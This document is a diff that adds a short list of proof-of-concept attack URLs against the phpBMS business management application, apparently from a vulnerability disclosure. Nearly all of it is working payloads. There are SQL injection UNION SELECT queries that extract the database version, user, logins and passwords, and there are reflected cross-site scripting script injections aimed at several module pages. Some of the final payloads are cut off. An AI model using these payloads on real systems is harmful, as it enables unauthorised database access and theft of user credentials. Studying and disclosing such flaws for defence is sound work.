@@ -1,0 +1,13 @@
+http://www.example.com/modules/bms/invoices_discount_ajax.php?id=-1+union+select+concat_ws(0x3a,version(),user(),database())
+http://www.example.com/dbgraphic.php?f=concat_ws(id,login,password)&mf=1&t=users&r=1
+http://www.example.com/advancedsearch.php?cmd=show&tid=-1+union+select+login+from+users&base=2
+http://www.example.com/advancedsearch.php?cmd=show&tid=-1+union+select+password+from+users&base=2
+
+
+http://www.example.com/index.php/&quot;&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;div id=&quot;
+http://www.example.com/modules\base\myaccount.php/&quot;&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;div id=&quot;
+http://www.example.com/phpbms\modules\base\modules_view.php&quot;&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;div id=&quot;
+http://www.example.com/phpbms\modules\base\tabledefs_options.php\&quot;&gt;{XSS}
+http://www.example.com/phpbms\modules\base\adminsettings.php\&quot;&gt;{XSS
+
+
